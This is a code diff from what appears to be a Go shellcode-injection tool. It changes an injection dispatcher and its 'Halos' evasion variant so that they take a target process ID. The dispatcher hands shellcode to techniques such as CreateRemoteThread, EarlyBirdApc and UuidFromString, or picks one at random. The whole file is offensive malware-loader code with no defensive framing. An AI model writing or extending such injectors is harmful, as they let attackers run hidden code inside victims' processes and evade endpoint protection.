@@ -8,35 +8,35 @@ import (
 
 var techniques = []string{"CreateRemoteThread", "Fibers", "CreateProcess", "EarlyBirdApc", "UuidFromString"}
 
-func Inject(shellcode []byte, technique string) (error) {
+func Inject(shellcode []byte, technique string, pid int) (error) {
 
   // Check especified injection technique
   if (strings.ToLower(technique) == "createremotethread") {
-    err := CreateRemoteThread(shellcode)
+    err := CreateRemoteThread(shellcode, pid)
     if err != nil { // Handle error
       return err
     }
 
   } else if (strings.ToLower(technique) == "fibers") {
-    err := Fibers(shellcode)
+    err := Fibers(shellcode, pid)
     if err != nil { // Handle error
       return err
     }
 
   } else if (strings.ToLower(technique) == "createprocess") {
-    err := CreateProcess(shellcode)
+    err := CreateProcess(shellcode, pid)
     if err != nil { // Handle error
       return err
     }
 
   } else if (strings.ToLower(technique) == "earlybirdapc") {
-    err := EarlyBirdApc(shellcode)
+    err := EarlyBirdApc(shellcode, pid)
     if err != nil { // Handle error
       return err
     }
 
   } else if (strings.ToLower(technique) == "uuidfromstring"){
-    err := UuidFromString(shellcode)
+    err := UuidFromString(shellcode, pid)
     if err != nil {
       return err
     }
@@ -44,7 +44,7 @@ func Inject(shellcode []byte, technique string) (error) {
   } else {
     rand_n := RandomInt(4, 0) // Choose a random technique
     fmt.Println("[*] Injecting shellcode using " + techniques[rand_n] + " function")
-    err := Inject(shellcode, techniques[rand_n])
+    err := Inject(shellcode, techniques[rand_n], pid)
     if err != nil { // Handle error
       return err
     }
@@ -53,15 +53,15 @@ func Inject(shellcode []byte, technique string) (error) {
   return nil
 }
 
-func InjectHalos(shellcode []byte, technique string) (error) {
+func InjectHalos(shellcode []byte, technique string, pid int) (error) {
   if (strings.ToLower(technique) == "createprocess") {
-    err := CreateProcessHalos(shellcode)
+    err := CreateProcessHalos(shellcode, pid)
     if err != nil {
       return err
     }
 
   } else if (strings.ToLower(technique) == "createremotethread") {
-    err := CreateRemoteThreadHalos(shellcode)
+    err := CreateRemoteThreadHalos(shellcode, pid)
     if err != nil {
       return err
     }
@@ -73,7 +73,7 @@ func InjectHalos(shellcode []byte, technique string) (error) {
   } else {
     rand_n := RandomInt(4, 0)
     fmt.Println("[*] Injecting shellcode using " + techniques[rand_n] + " function")
-    err := InjectHalos(shellcode, techniques[rand_n])
+    err := InjectHalos(shellcode, techniques[rand_n], pid)
     if err != nil {
       return err
     }
